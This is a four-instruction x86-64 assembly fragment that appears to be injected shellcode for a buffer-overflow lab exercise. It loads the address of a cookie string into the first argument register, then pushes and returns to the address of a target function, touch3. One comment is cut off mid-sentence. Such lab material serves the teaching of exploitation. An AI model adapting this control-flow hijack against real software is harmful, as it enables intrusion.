mov     $0x556685f8, %rdi   # move mem address of Cookie string into first argument register 
pushq   $0x00401efb         # push address of touch3 function onto the stack. This should ensure that
                            # rsp (stack pointer) is not only aligned correctly, but also points to 
retq
